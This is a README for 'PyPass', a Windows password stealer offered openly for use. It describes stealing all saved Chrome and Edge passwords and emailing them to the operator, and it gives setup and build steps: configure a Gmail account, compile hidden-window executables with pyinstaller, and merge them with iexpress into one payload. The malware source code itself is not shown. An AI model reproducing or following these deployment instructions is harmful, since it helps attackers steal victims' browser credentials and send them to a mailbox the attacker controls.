# PyPass
PyPass is a password stealer for Windows. 
It steals all Chrome &amp; Edge(Beta) passwords and sends via mail to you in a .txt file.

Setup:
Edit the fields gmail, password, message['To'], message['CC'] to get ready to use.

Converting to an .exe file:
1. install pyinstaller
2. run pyinstaller in the folder with these scripts.
3. Command: pyinstaller --onefile --windowed PyPass Github.pyw 
4. Command: pyinstaller --onefile --windowed delete.pyw 

The .exe file will be located in a folder called dist.
To merge these two files to one you have to use iexpress.

NOTE: Edge passwords are work.
